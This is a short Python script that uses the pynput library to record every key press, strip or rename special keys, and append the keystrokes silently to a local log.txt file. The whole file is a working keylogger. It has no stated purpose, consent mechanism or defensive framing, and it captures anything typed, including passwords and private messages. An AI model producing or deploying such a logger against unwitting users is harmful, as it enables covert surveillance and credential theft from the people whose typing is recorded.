import pynput


def WriteToFile(key):
    keyCode = str(key)
    keyCode = keyCode.replace("'", "")

    if keyCode == "Key.alt":  # Changes Special Keys
        keyCode = ""
    elif keyCode == "Key.alt_gr":
        keyCode = ""
    elif keyCode == "Key.backspace":
        keyCode = "BACKSPACE"
    elif keyCode == "Key.caps_lock":
        keyCode = "CAP"
    elif keyCode == "Key.cmd":
        keyCode = ""
    elif keyCode == "Key.ctrl":
        keyCode = ""
    elif keyCode == "Key.ctrl_l":
        keyCode = ""
    elif keyCode == "Key.ctrl_r":
        keyCode = ""
    elif keyCode == "Key.delete":
        keyCode = "DEL"
    elif keyCode == "Key.down":
        keyCode = ""
    elif keyCode == "Key.end":
        keyCode = ""
    elif keyCode == "Key.enter":
        keyCode = "\n"
    elif keyCode == "Key.esc":
        keyCode = ""
    elif keyCode == "Key.f1":
        keyCode = ""
    elif keyCode == "Key.f2":
        keyCode = ""
    elif keyCode == "Key.f3":
        keyCode = ""
    elif keyCode == "Key.f4":
        keyCode = ""
    elif keyCode == "Key.f5":
        keyCode = ""
    elif keyCode == "Key.f6":
        keyCode = ""
    elif keyCode == "Key.f7":
        keyCode = ""
    elif keyCode == "Key.f8":
        keyCode = ""
    elif keyCode == "Key.f9":
        keyCode = ""
    elif keyCode == "Key.f10":
        keyCode = ""
    elif keyCode == "Key.f11":
        keyCode = ""
    elif keyCode == "Key.f12":
        keyCode = ""
    elif keyCode == "Key.home":
        keyCode = ""
    elif keyCode == "Key.insert":
        keyCode = ""
    elif keyCode == "Key.left":
        keyCode = ""
    elif keyCode == "Key.menu":
        keyCode = ""
    elif keyCode == "Key.num_lock":
        keyCode = ""
    elif keyCode == "Key.page_down":
        keyCode = ""
    elif keyCode == "Key.page_up":
        keyCode = ""
    elif keyCode == "Key.pause":
        keyCode = ""
    elif keyCode == "Key.print_screen":
        keyCode = ""
    elif keyCode == "Key.right":
        keyCode = ""
    elif keyCode == "Key.scroll_lock":
        keyCode = ""
    elif keyCode == "Key.shift":
        keyCode = ""
    elif keyCode == "Key.shift_l":
        keyCode = ""
    elif keyCode == "Key.shift_r":
        keyCode = ""
    elif keyCode == "Key.space":
        keyCode = " "
    elif keyCode == "Key.tab":
        keyCode = ""
    elif keyCode == "Key.up":
        keyCode = ""

    with open("log.txt", "a") as txtFile:
        txtFile.write(keyCode)


with pynput.keyboard.Listener(on_press=WriteToFile) as keyboardListener:
    keyboardListener.join()
